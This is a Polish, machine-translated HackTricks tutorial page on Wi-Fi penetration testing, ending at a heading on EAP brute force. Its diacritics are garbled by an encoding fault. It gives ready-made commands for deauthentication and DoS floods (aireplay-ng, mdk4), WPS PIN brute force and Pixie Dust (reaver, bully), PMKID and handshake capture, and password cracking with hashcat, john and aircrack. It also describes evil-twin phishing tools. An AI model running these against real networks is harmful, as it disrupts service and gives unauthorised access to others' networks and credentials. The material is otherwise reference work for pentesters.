# Testowanie penetracyjne Wifi

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakowania, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na GitHubie.

</details>

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Docz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowa si z dowiadczonymi hakerami i owcami bd贸w!

**Spojrzenie na Hakowanie**\
Zanurz si w treciach, kt贸re zgbiaj emocje i wyzwania hakowania

**Aktualnoci z Hakowania na 呕ywo**\
Bd藕 na bie偶co z szybkim tempem wiata hakowania dziki aktualnociom i wgldom w czasie rzeczywistym

**Najnowsze Ogoszenia**\
Bd藕 na bie偶co z najnowszymi programami bug bounty i istotnymi aktualizacjami platformy

**Docz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wsp贸pracowa z najlepszymi hakerami ju偶 dzi!

## Podstawowe polecenia Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Narzdzia

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon to pot偶ne narzdzie do testowania bezpieczestwa sieci Wi-Fi, kt贸re integruje wiele popularnych narzdzi w jednym interfejsie. Mo偶e by u偶ywane do atak贸w typu WPA/WPA2, WPS, WEP, a tak偶e do przechwytywania ruchu sieciowego. Jego funkcje obejmuj ataki deautoryzacyjne, ataki Evil Twin, ataki PMKID, ataki krack i wiele innych. Jest to przydatne narzdzie do testowania bezpieczestwa sieci Wi-Fi podczas test贸w penetracyjnych.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Uruchom airgeddon za pomoc dockera**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Mo偶e przeprowadza ataki Evil Twin, KARMA i Known Beacons, a nastpnie u偶y szablonu phishingowego do uzyskania rzeczywistego hasa sieciowego lub przechwycenia danych uwierzytelniajcych w sieciach spoecznociowych.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

To narzdzie automatyzuje ataki **WPS/WEP/WPA-PSK**. Automatycznie:

* Ustawia interfejs w tryb monitora
* Skanuje mo偶liwe sieci - i pozwala wybra ofiary
* Jeli WEP - Uruchamia ataki WEP
* Jeli WPA-PSK
* Jeli WPS: Atak Pixie dust i atak bruteforce (bd藕 ostro偶ny, atak bruteforce mo偶e potrwa dugo). Zauwa偶, 偶e nie pr贸buje pustego PIN-u ani PIN-贸w z bazy danych/wygenerowanych.
* Pr贸buje przechwyci PMKID z AP w celu zamania go
* Pr贸buje dezautoryzowa klient贸w AP w celu przechwycenia handshake'a
* Jeli PMKID lub Handshake, pr贸buje bruteforce u偶ywajc top5000 hase.

## Podsumowanie Atak贸w

* **DoS**
* Pakiety dezautoryzacyjne -- Rozcza wszystkich (lub okrelony ESSID/Klient)
* Losowe faszywe AP -- Ukrywa sieci, mo偶liwe zatrzymanie skaner贸w
* Przeci偶enie AP -- Pr贸buje zabi AP (zazwyczaj mao u偶yteczne)
* WIDS -- Gra z IDS
* TKIP, EAPOL -- Kilka konkretnych atak贸w DoS na niekt贸re AP
* **amanie**
* amanie **WEP** (kilka narzdzi i metod)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** bruteforce
* \[DoS +] Przechwycenie **WPA handshake** + amanie
* **WPA-MGT**
* Przechwycenie **Nazwy u偶ytkownika**
* **Bruteforce** Powiadcze
* **Zy bli藕niak** (z lub bez DoS)
* **Otwarty** Zy bli藕niak \[+ DoS] -- Przydatne do przechwycenia danych logowania do portalu captiv portal i/lub przeprowadzenia atak贸w LAN
* **WPA-PSK** Zy bli藕niak -- Przydatne do atak贸w sieciowych, jeli znasz haso
* **WPA-MGT** -- Przydatne do przechwytywania danych logowania firmowych
* **KARMA, MANA**, **Gony MANA**, **Znany sygna**
* **+ Otwarty** -- Przydatne do przechwycenia danych logowania do portalu captiv portal i/lub przeprowadzenia atak贸w LAN
* **+ WPA** -- Przydatne do przechwycenia WPA handshake'贸w

## DOS

### Pakiety Dezautoryzacyjne

**Opis z** [**tutaj**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Ataki **dezautoryzacyjne**, powszechna metoda w hakowaniu Wi-Fi, polegaj na faszowaniu ramek "zarzdzania" w celu **przymuszenia rozczenia urzdze z sieci**. Te niezaszyfrowane pakiety wprowadzaj klient贸w w bd, sprawiajc, 偶e wierz, i偶 pochodz one od prawidowej sieci, umo偶liwiajc atakujcym zbieranie handshake'贸w WPA w celach amania lub trwale zak贸cania pocze sieciowych. Ta taktyka, zaskakujco prosta, jest powszechnie stosowana i ma istotne implikacje dla bezpieczestwa sieci. 

**Deautoryzacja za pomoc Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 oznacza deautoryzacj
* 1 to liczba deautoryzacji do wysania (mo偶esz wysa ich wiele, jeli chcesz); 0 oznacza wysyanie ich cigle
* \-a 00:14:6C:7E:40:80 to adres MAC punktu dostpu
* \-c 00:0F:B5:34:30:30 to adres MAC klienta do deautoryzacji; jeli jest pominity, wysyana jest deautoryzacja rozgoszeniowa (nie zawsze dziaa)
* ath0 to nazwa interfejsu

### Pakiety rozczenia

**Pakiety rozczenia**, podobnie jak pakiety deautoryzacji, s rodzajem ramek zarzdzania u偶ywanych w sieciach Wi-Fi. Te pakiety su偶 do zerwania poczenia midzy urzdzeniem (takim jak laptop lub smartfon) a punktem dostpu (AP). G贸wna r贸偶nica midzy rozczeniem a deautoryzacj polega na ich scenariuszach u偶ycia. Podczas gdy AP emituje **pakiety deautoryzacji, aby wyra藕nie usun urzdzenia szpiegowskie z sieci, pakiety rozczenia s zazwyczaj wysyane, gdy AP przechodzi przez wyczenie, restart lub przeniesienie, co wymaga rozczenia wszystkich podczonych wz贸w**.

**Ten atak mo偶na przeprowadzi za pomoc mdk4 (tryb "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Wicej atak贸w DOS za pomoc mdk4**

**Tutaj** [**(link)**](https://en.kali.tools/?p=864)**.**

**TRYB ATAKU b: Zatopienie Beacon贸w**

Wysya ramki beacon贸w, aby pokaza faszywe punkty dostpu klientom. Czasami mo偶e to spowodowa awari skaner贸w sieciowych i nawet sterownik贸w!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**TRYB ATAKI a: Usuga odmowy uwierzytelnienia**

Wysyanie ramek uwierzytelniajcych do wszystkich dostpnych punkt贸w dostpu (AP) w zasigu mo偶e przeci偶y te punkty dostpu, zwaszcza gdy zaanga偶owanych jest wiele klient贸w. Intensywny ruch mo偶e prowadzi do niestabilnoci systemu, powodujc zatrzymanie pracy niekt贸rych punkt贸w dostpu lub nawet ich resetowanie.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**TRYB ATAKI p: Sondowanie SSID i Bruteforcing**

Sondowanie punkt贸w dostpu (AP) sprawdza, czy SSID jest poprawnie ujawnione i potwierdza zasig AP. Ta technika, w poczeniu z **bruteforcingiem ukrytych SSID** z lub bez listy s贸w, pomaga zidentyfikowa i uzyska dostp do ukrytych sieci.

**TRYB ATAKI m: Wykorzystanie Kontratak贸w Michaela**

Wysyanie losowych lub zduplikowanych pakiet贸w do r贸偶nych kolejek QoS mo偶e wywoa Kontratakty Michaela na AP **TKIP**, prowadzc do jednominutowego wyczenia AP. Ta metoda jest efektywn taktyk ataku **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**TRYB ATAKI e: Wstrzykiwanie pakiet贸w EAPOL Start i Logoff**

Zalewanie punktu dostpowego pakietami **EAPOL Start** tworzy **faszywe sesje**, przytaczajc AP i blokujc prawidowych klient贸w. Alternatywnie, wstrzykiwanie **faszywych komunikat贸w EAPOL Logoff** si rozcza klient贸w, obie metody skutecznie zak贸caj usugi sieciowe.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**TRYB ATAKI s: Ataki na sieci siatek IEEE 802.11s**

R贸偶ne ataki na zarzdzanie czem i trasowanie w sieciach siatek.

**TRYB ATAKI w: Konfuzja WIDS**

Krzy偶owe czenie klient贸w z wieloma wzami WDS lub faszywymi rogue AP mo偶e manipulowa Systemami Wykrywania i Zapobiegania Wamaniom, tworzc konfuzj i potencjalne nadu偶ycia systemu.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**TRYB ATAKI f: Packet Fuzzer**

Fuzer pakiet贸w oferujcy r贸偶norodne 藕r贸da pakiet贸w i kompleksowy zestaw modyfikator贸w do manipulacji pakietami.

### **Airggedon**

_**Airgeddon**_ oferuje wikszo atak贸w proponowanych w poprzednich komentarzach:

![](<../../.gitbook/assets/image (92).png>)

## WPS

WPS (Wi-Fi Protected Setup) upraszcza proces podczania urzdze do routera, zwikszajc szybko i atwo konfiguracji sieci zaszyfrowanych za pomoc **WPA** lub **WPA2** Personal. Jest nieskuteczny dla atwo kompromitowanej ochrony WEP. WPS wykorzystuje 8-cyfrowy PIN, walidowany w dw贸ch czciach, co czyni go podatnym na ataki brute-force ze wzgldu na ograniczon liczb kombinacji (11 000 mo偶liwoci).

### Atak Brute Force na WPS

Istniej 2 g贸wne narzdzia do wykonania tej akcji: Reaver i Bully.

* **Reaver** zosta zaprojektowany jako solidny i praktyczny atak na WPS, i zosta przetestowany na wielu punktach dostpu i implementacjach WPS.
* **Bully** to **nowa implementacja** ataku brute force na WPS, napisana w jzyku C. Posiada kilka zalet w por贸wnaniu z oryginalnym kodem reaver: mniej zale偶noci, poprawiona wydajno pamici i procesora, poprawna obsuga kolejnoci bajt贸w oraz bardziej stabilny zestaw opcji.

Atak wykorzystuje **podatno PIN WPS**, w szczeg贸lnoci ujawnienie pierwszych czterech cyfr PIN-u oraz rol ostatniej cyfry jako sumy kontrolnej, uatwiajc atak brute-force. Jednak obrona przed atakami brute-force, jak **blokowanie adres贸w MAC** agresywnych atakujcych, wymaga **rotacji adres贸w MAC** aby kontynuowa atak.

Po uzyskaniu PIN-u WPS za pomoc narzdzi takich jak Bully lub Reaver, atakujcy mo偶e wydedukowa PSK WPA/WPA2, zapewniajc **trway dostp do sieci**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Inteligentny atak siowy**

To udoskonalone podejcie skupiajce si na PIN-ach WPS wykorzystujce znane podatnoci:

1. **Wczeniej odkryte PIN-y**: Wykorzystaj baz danych znanych PIN-贸w powizanych z konkretnymi producentami, kt贸rzy stosuj jednolite PIN-y WPS. Ta baza danych koreluje pierwsze trzy oktety adres贸w MAC z prawdopodobnymi PIN-ami dla tych producent贸w.
2. **Algorytmy generowania PIN-贸w**: Wykorzystaj algorytmy takie jak ComputePIN i EasyBox, kt贸re obliczaj PIN-y WPS na podstawie adresu MAC punktu dostpowego. Dodatkowo algorytm Arcadyan wymaga identyfikatora urzdzenia, co dodaje warstw do procesu generowania PIN-贸w.

### Atak WPS Pixie Dust

**Dominique Bongard** odkry wad w niekt贸rych punktach dostpowych (AP), dotyczc tworzenia tajnych kod贸w, znanych jako **nonce** (**E-S1** i **E-S2**). Jeli te nonce'y mog zosta odkryte, zamanie PIN-u WPS AP staje si atwe. AP ujawnia PIN w specjalnym kodzie (hash), aby udowodni, 偶e jest on autentyczny i nie jest faszywym (rogue) AP. Te nonce'y s w zasadzie "kluczami" do odblokowania "sejfu", kt贸ry przechowuje PIN WPS. Wicej informacji na ten temat mo偶na znale藕 [tutaj](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

W prostych sowach, problem polega na tym, 偶e niekt贸re AP nie u偶yway wystarczajco losowych kluczy do szyfrowania PIN-u podczas procesu czenia. Sprawia to, 偶e PIN jest podatny na zgadywanie spoza sieci (atak siowy offline).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Jeli nie chcesz przecza urzdzenia w tryb monitorowania, lub `reaver` i `bully` maj jakie problemy, mo偶esz spr贸bowa [OneShot-C](https://github.com/nikita-yfh/OneShot-C). To narzdzie mo偶e przeprowadzi atak Pixie Dust bez koniecznoci przeczania si w tryb monitorowania.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Atak Null Pin

Niekt贸re 藕le zaprojektowane systemy pozwalaj nawet na u偶ycie **Null PIN** (pustego lub nieistniejcego PIN-u) do uzyskania dostpu, co jest do nietypowe. Narzdzie **Reaver** potrafi wykry t podatno, w przeciwiestwie do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Wszystkie proponowane ataki WPS mo偶na atwo przeprowadzi za pomoc _**airgeddon.**_

![](<../../.gitbook/assets/image (216).png>)

* 5 i 6 pozwalaj Ci wypr贸bowa **swoj niestandardow PIN** (jeli masz tak)
* 7 i 8 wykonuj atak **Pixie Dust**
* 13 pozwala przetestowa **NULL PIN**
* 11 i 12 bd **odzyskiwa Piny zwizane z wybranym AP z dostpnych baz danych** i **generowa** mo偶liwe **Piny** za pomoc: ComputePIN, EasyBox i opcjonalnie Arcadyan (zalecane, dlaczego nie?)
* 9 i 10 przetestuj **ka偶dy mo偶liwy PIN**

## **WEP**

Tak zdezaktualizowany i nieu偶ywany obecnie. Warto wiedzie, 偶e _**airgeddon**_ ma opcj WEP o nazwie "All-in-One" do ataku na ten rodzaj zabezpieczenia. Wicej narzdzi oferuje podobne opcje.

![](<../../.gitbook/assets/image (429).png>)

***

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Docz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowa si z dowiadczonymi hakerami i owcami bd贸w!

**Wnioski z Hackingu**\
Zanurz si w treciach, kt贸re zgbiaj emocje i wyzwania zwizane z hakowaniem

**Aktualnoci z Hackingu na 呕ywo**\
Bd藕 na bie偶co z szybkim tempem wiata hakowania dziki aktualnociom i wnioskom na 偶ywo

**Najnowsze Ogoszenia**\
Bd藕 na bie偶co z najnowszymi programami bug bounty i istotnymi aktualizacjami platformy

**Docz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wsp贸pracowa z najlepszymi hakerami ju偶 dzi!

***

## WPA/WPA2 PSK

### PMKID

W 2018 roku **hashcat** [ujawni](https://hashcat.net/forum/thread-7717.html) now metod ataku, unikaln, poniewa偶 wymaga tylko **jednego pakietu** i nie wymaga, aby jakiekolwiek klienty byy podczone do docelowego APtylko interakcja midzy atakujcym a AP.

Wiele nowoczesnych router贸w dodaje **opcjonalne pole** do **pierwszej ramki EAPOL** podczas czenia, znane jako `Robust Security Network`. Zawiera ono `PMKID`.

Jak wyjania oryginalny post, **PMKID** jest tworzony przy u偶yciu znanych danych:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Majc na uwadze, 偶e "Nazwa PMK" jest staa, znamy BSSID punktu dostpowego i stacji, a `PMK` jest identyczny z tym z penego 4-stopniowego ucisku doni, **hashcat** mo偶e wykorzysta te informacje do zamania PSK i odzyskania hasa!

Aby **zbada** te informacje i **przeprowadzi** lokalnie atak brutalnej siy na haso, mo偶esz:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Zapane **PMKIDs** zostan pokazane w **konsoli** i r贸wnie偶 **zapisane** w pliku \_ **/tmp/attack.pcap**\_\
Teraz przekonwertuj przechwycone dane do formatu **hashcat/john** i zam je:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Prosz zauwa偶y, 偶e poprawny format hasha zawiera **4 czci**, na przykad: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`. Jeli Tw贸j zawiera **tylko 3 czci**, to jest **nieprawidowy** (przechwycenie PMKID nie byo wa偶ne).

Zauwa偶, 偶e `hcxdumptool` **r贸wnie偶 przechwytuje handshake** (co w tym stylu si pojawi: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Mo偶esz **przeksztaci** handshake do formatu **hashcat**/**john** u偶ywajc `cap2hccapx`.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Zauwa偶yem, 偶e niekt贸re uchwyty przechwycone tym narzdziem nie mogy zosta zamane, nawet znajc poprawne haso. Zalecam przechwytywanie uchwyt贸w r贸wnie偶 w tradycyjny spos贸b, jeli to mo偶liwe, lub przechwytywanie kilku z nich za pomoc tego narzdzia._

### Przechwytywanie uchwyt贸w

Atak na sieci **WPA/WPA2** mo偶e by przeprowadzony poprzez przechwycenie **uchwytu** i pr贸b **zlamania** hasa **offline**. Proces ten polega na monitorowaniu komunikacji okrelonej sieci i **BSSID** na konkretnym **kanale**. Oto uproszczony przewodnik:

1. Zidentyfikuj **BSSID**, **kana** i **podczonego klienta** docelowej sieci.
2. U偶yj `airodump-ng`, aby monitorowa ruch sieciowy na okrelonym kanale i BSSID, w nadziei na przechwycenie uchwytu. Polecenie bdzie wyglda tak:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Aby zwikszy szans na przechwycenie handshake'u, chwilowo odcz klienta od sieci, aby wymusi ponown autoryzacj. Mo偶na to zrobi za pomoc polecenia `aireplay-ng`, kt贸re wysya pakiety deautoryzacyjne do klienta:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Nale偶y pamita, 偶e gdy klient zostanie wylogowany, mo偶e pr贸bowa poczy si z innym AP lub, w innych przypadkach, z inn sieci._

Gdy w `airodump-ng` pojawi si informacje o handshake, oznacza to, 偶e handshake zosta przechwycony i mo偶na zakoczy nasuchiwanie:

![](<../../.gitbook/assets/image (172) (1).png>)

Po przechwyceniu handshake'u mo偶na go **zama** za pomoc `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Sprawd藕, czy w pliku jest handshake

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Jeli to narzdzie znajdzie niekompletny handshake ESSID przed ukoczonym, nie wykryje poprawnego._ 

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

W **konfiguracjach WiFi dla firm, napotkasz r贸偶ne metody uwierzytelniania**, z kt贸rych ka偶da zapewnia r贸偶ne poziomy bezpieczestwa i funkcje zarzdzania. Korzystajc z narzdzi takich jak `airodump-ng` do analizy ruchu sieciowego, mo偶esz zauwa偶y identyfikatory tych typ贸w uwierzytelniania. Niekt贸re powszechne metody obejmuj:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Ta metoda obsuguje tokeny sprztowe i jednorazowe hasa w ramach EAP-PEAP. W przeciwiestwie do MSCHAPv2, nie korzysta z wyzwania r贸wienika i przesya hasa w postaci tekstowej do punktu dostpu, co stwarza ryzyko atak贸w typu downgrade.
2. **EAP-MD5 (Message Digest 5)**:
* Polega na wysyaniu skr贸tu MD5 hasa z klienta. **Nie jest zalecane** ze wzgldu na podatno na ataki sownikowe, brak uwierzytelniania serwera i brak mo偶liwoci generowania sesyjnych kluczy WEP.
3. **EAP-TLS (Transport Layer Security)**:
* Wykorzystuje certyfikaty po stronie klienta i serwera do uwierzytelniania oraz mo偶e dynamicznie generowa klucze WEP oparte na u偶ytkowniku i sesji w celu zabezpieczenia komunikacji.
4. **EAP-TTLS (Tunelowany Transport Layer Security)**:
* Zapewnia wzajemne uwierzytelnianie poprzez zaszyfrowany tunel oraz metod generowania dynamicznych, per-user, per-session kluczy WEP. Wymaga tylko certyfikat贸w po stronie serwera, a klienci u偶ywaj powiadcze.
5. **PEAP (Protected Extensible Authentication Protocol)**:
* Dziaa podobnie do EAP, tworzc tunel TLS do chronionej komunikacji. Pozwala na u偶ycie sabszych protoko贸w uwierzytelniania na EAP ze wzgldu na ochron zapewnian przez tunel.
* **PEAP-MSCHAPv2**: Czsto nazywane PEAP, czy podatny mechanizm wyzwania/odpowiedzi MSCHAPv2 z ochronnym tunelem TLS.
* **PEAP-EAP-TLS (lub PEAP-TLS)**: Podobne do EAP-TLS, ale inicjuje tunel TLS przed wymian certyfikat贸w, oferujc dodatkow warstw zabezpiecze.

Wicej informacji na temat tych metod uwierzytelniania znajdziesz [tutaj](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) i [tutaj](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Przechwytywanie Nazwy U偶ytkownika

Czytajc [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) wyglda na to, 偶e jeli u偶ywasz **EAP**, **"Identity"** **wiadomoci** musz by **obsugiwane**, a **nazwa u偶ytkownika** zostanie przesana w **czystej postaci** w wiadomociach **"Response Identity"**.

Nawet korzystajc z jednej z najbardziej bezpiecznych metod uwierzytelniania: **PEAP-EAP-TLS**, mo偶liwe jest **przechwycenie nazwy u偶ytkownika wysanej w protokole EAP**. Aby to zrobi, **przechwy komunikacj uwierzytelniania** (uruchom `airodump-ng` na kanale i `wireshark` na tej samej interfejsie) i przefiltruj pakiety za pomoc `eapol`.\
W pakiecie "**Response, Identity**" pojawi si **nazwa u偶ytkownika** klienta.

![](<../../.gitbook/assets/image (847).png>)

### Anonimowe To偶samoci

Ukrywanie to偶samoci jest obsugiwane zar贸wno przez EAP-PEAP, jak i EAP-TTLS. W kontekcie sieci WiFi, 偶danie EAP-Identity jest zazwyczaj inicjowane przez punkt dostpu (AP) podczas procesu czenia. Aby zapewni ochron anonimowoci u偶ytkownika, odpowied藕 klienta EAP na urzdzeniu u偶ytkownika zawiera tylko niezbdne informacje wymagane do przetworzenia 偶dania przez pocztkowy serwer RADIUS. Ten koncept jest zilustrowany poprzez nastpujce scenariusze:

* EAP-Identity = anonymous
* W tym scenariuszu wszyscy u偶ytkownicy u偶ywaj pseudonimu "anonymous" jako identyfikatora u偶ytkownika. Pocztkowy serwer RADIUS dziaa jako serwer EAP-PEAP lub EAP-TTLS, odpowiedzialny za zarzdzanie serwerow stron protokou PEAP lub TTLS. Wewntrzna (chroniona) metoda uwierzytelniania jest nastpnie obsugiwana lokalnie lub przekazywana do zdalnego (domowego) serwera RADIUS.
* EAP-Identity = anonymous@realm\_x
* W tej sytuacji u偶ytkownicy z r贸偶nych domen ukrywaj swoje to偶samoci, jednoczenie wskazujc swoje odpowiednie domeny. Pozwala to pocztkowemu serwerowi RADIUS na przekierowanie 偶da EAP-PEAP lub EAP-TTLS do serwer贸w RADIUS w ich domenach domowych, kt贸re dziaaj jako serwer PEAP lub TTLS. Pocztkowy serwer RADIUS dziaa wycznie jako wze przekazywania RADIUS.
* Alternatywnie, pocztkowy serwer RADIUS mo偶e dziaa jako serwer EAP-PEAP lub EAP-TTLS i albo obsugiwa chronion metod uwierzytelniania, albo przekazywa j do innego serwera. Ta opcja uatwia konfiguracj r贸偶nych polityk dla r贸偶nych domen.

W EAP-PEAP, gdy tunel TLS jest ustanowiony midzy serwerem PEAP a klientem PEAP, serwer PEAP inicjuje 偶danie EAP-Identity i przesya je przez tunel TLS. Klient odpowiada na to drugie 偶danie EAP-Identity, wysyajc odpowied藕 EAP-Identity zawierajc prawdziw to偶samo u偶ytkownika przez zaszyfrowany tunel. Ten spos贸b skutecznie zapobiega ujawnieniu rzeczywistej to偶samoci u偶ytkownika osobie podsuchujcej ruch 802.11.

EAP-TTLS postpuje nieco inaczej. W przypadku EAP-TTLS, klient zazwyczaj uwierzytelnia si za pomoc PAP lub CHAP, zabezpieczonych tunelowym TLS. W tym przypadku klient zawiera atrybut User-Name oraz atrybut Password lub CHAP-Password w pocztkowej wiadomoci TLS wysanej po ustanowieniu tunelu.

Niezale偶nie od wybranego protokou, serwer PEAP/TTLS uzyskuje wiedz o prawdziwej to偶samoci u偶ytkownika po ustanowieniu tunelu TLS. Prawdziwa to偶samo mo偶e by reprezentowana jako user@realm lub po prostu user. Jeli serwer PEAP/TTLS jest r贸wnie偶 odpowiedzialny za uwierzytelnianie u偶ytkownika, teraz posiada to偶samo u偶ytkownika i kontynuuje metod uwierzytelniania chronion przez tunel TLS. W przeciwnym razie serwer PEAP/TTLS mo偶e przekaza nowe 偶danie RADIUS do domowego serwera RADIUS u偶ytkownika. To nowe 偶danie RADIUS pomija warstw protokou PEAP lub TTLS. W przypadkach, gdy chroniona metoda uwierzytelniania to EAP, wewntrzne wiadomoci EAP s przesyane do domowego serwera RADIUS bez opakowania EAP-PEAP lub EAP-TTLS. Atrybut User-Name w wychodzcej wiadomoci RADIUS zawiera prawdziw to偶samo u偶ytkownika, zastpujc anonimowy User-Name z przychodzcego 偶dania RADIUS. Gdy chroniona metoda uwierzytelniania to PAP lub CHAP (obsugiwane tylko przez TTLS), atrybuty User-Name i inne atrybuty uwierzytelniania wyodrbnione z adunku TLS zastpuj anonimowy User-Name i atrybuty TTLS EAP-Message znalezione w przychodzcym 偶daniu RADIUS.

Wicej informacji znajdziesz pod adresem [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (password spray)

